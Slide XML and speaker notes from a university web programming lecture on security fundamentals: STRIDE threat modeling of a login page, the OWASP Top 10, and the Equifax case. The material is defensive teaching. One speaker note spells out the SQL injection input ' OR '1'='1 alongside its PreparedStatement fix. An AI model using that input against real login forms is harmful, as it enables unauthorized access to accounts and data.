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Week 3: the structural model (what data exists) is exactly what a threat model needs first — you can't protect data you haven't identified. Today we threat-model a real login page, survey the OWASP Top 10, and compare real vulnerable vs. secure Java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five topics. Frame security as continuing directly from Week 3's non-functional requirements — today gives concrete technique for the security requirements students write for their own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STRIDE was developed at Microsoft and remains the most widely taught threat-modeling checklist. Walking through each letter against a concrete system (next slide) makes it much more concrete than the acronym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six STRIDE letters against this one real flow — this is the exercise students should repeat for their own project's login page. Note 'E' (SQL injection) is the vulnerability we fix in code on a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is updated periodically by OWASP based on real incident data — it isn't theoretical, it's a ranking of what actually happens most often. Ranks 6-10 continue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Cross-Site Scripting (XSS) was folded into the broader 'Injection' category in the most recent OWASP revision, but it's common enough and distinct enough that we treat it separately today, alongside CSRF which isn't in the current Top 10 by name but remains a real, teachable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attacker's input literally: entering ' OR '1'='1 into the email field turns the WHERE clause into an always-true condition. The fix isn't 'sanitize the input' — it's using a PreparedStatement so user input can never be interpreted as SQL syntax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reflected XSS example. Point out the cookie-theft payload connects directly to Week 2's cookie-based session discussion — a stolen session cookie lets the attacker impersonate the logged-in user without ever knowing their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to Week 2's sequence diagram of cookie-based login — the fix here is exactly the Set-Cookie step from that diagram, but issued fresh at authentication time rather than reusing whatever session existed beforehand.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CSRF from XSS clearly: XSS runs attacker script inside your site; CSRF tricks the browser into sending a legitimate-looking request from a completely different, malicious site, relying on cookies being sent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well-documented case (U.S. GAO and congressional testimony are public record). The teaching point: security failures are rarely exotic zero-days — they're usually ordinary hygiene failures (patching, monitoring)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layer back to today's content: Application layer is where SQL injection and XSS fixes live; Authentication layer is where the session-fixation fix lives; Monitoring is exactly what Equifax lacked. No single layer would have stopped Equifax alone — patching (Application/Monitoring) would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is intentionally a direct mapping back to today's four code deep-dives plus the Equifax lesson (dependencies, monitoring) — encourage students to run their own project code against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self-check before Day 2: Web Performance &amp; Analytics, which shifts from securing the system to measuring and optimising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five key points. Bridge to Day 2: Web Performance &amp; Analytics — having secured the system, we now turn to measuring and optimising how it performs under real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7"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Text 0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="11064240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9FB3C8"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSE 0613-2209 · Web Programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2697480"/>
            <a:ext cx="11064240" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CADCFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Module 2: Methodologies &amp; Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3200400"/>
            <a:ext cx="11064240" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Week 4, Day 1 — Security Fundamentals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4160520"/>
            <a:ext cx="2011680" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="AFC2D2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4343400"/>
            <a:ext cx="9509760" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D6E0EA"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Threat modeling a real login page, the OWASP Top 10, and vulnerable-vs-secure Java code you can compare line by line.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6126480"/>
            <a:ext cx="11064240" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7A93AC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Department of Computer Science and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WEEK 4 · DAY 1</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This Session at a Glance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="6949440" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Threat modeling a real login page using STRIDE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>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The OWASP Top 10 — what it is and why it's the industry baseline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>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Four vulnerabilities in depth, each with vulnerable vs. secure Java code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>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A real breach case study and what specifically went wrong</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>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Defense in depth — layering protections rather than relying on one</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="1371600"/>
            <a:ext cx="3017520" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2424"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7882128" y="1499616"/>
            <a:ext cx="2615184" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why This Matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7882128" y="1874520"/>
            <a:ext cx="2615184" cy="35661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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Security is the non-functional requirement with the highest cost of failure — a missed performance target is slow; a missed security requirement can be a breach.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>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9" name="Text 7"/>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4.1 THREAT MODELING</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What Is Threat Modeling?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="5349240" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="1499616"/>
            <a:ext cx="4946904" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="1874520"/>
            <a:ext cx="4946904" cy="146304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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A structured process for identifying what could go wrong with a system — who might attack it, how, and what damage they could do — before writing the code that defends against it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1371600"/>
            <a:ext cx="5349240" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1499616"/>
            <a:ext cx="4946904" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STRIDE Framework</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1874520"/>
            <a:ext cx="4946904" cy="146304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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A practical checklist: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege — six ways a system can be attacked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3657600"/>
            <a:ext cx="5349240" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="3785616"/>
            <a:ext cx="4946904" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Where It Fits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="4160520"/>
            <a:ext cx="4946904" cy="146304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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Threat modeling happens right after the structural model (Week 3) — you model what data and components exist, then ask how each one could be attacked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="3657600"/>
            <a:ext cx="5349240" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="3785616"/>
            <a:ext cx="4946904" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Output</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="4160520"/>
            <a:ext cx="4946904" cy="146304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Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A diagram marking trust boundaries and attack points, plus a list of mitigations — exactly what we build for a login page next.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>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17" name="Text 15"/>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FIGURE 4.1 · REAL-WORLD EXAMPLE</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Threat Model — A Real Login Page</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="11064240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B2B2B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Trust boundaries and attack points across a standard email/password login flow.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1920240"/>
            <a:ext cx="2331720" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="1920240"/>
            <a:ext cx="2185416" cy="850392"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F3B57"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Times New Roman" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="2699766"/>
            <a:ext cx="2185416" cy="566928"/>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User types email + password into an HTML form</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3246120" y="1920240"/>
            <a:ext cx="2331720" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3871"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8EEF3"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="1F3B57"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3319272" y="1920240"/>
            <a:ext cx="2185416" cy="850392"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
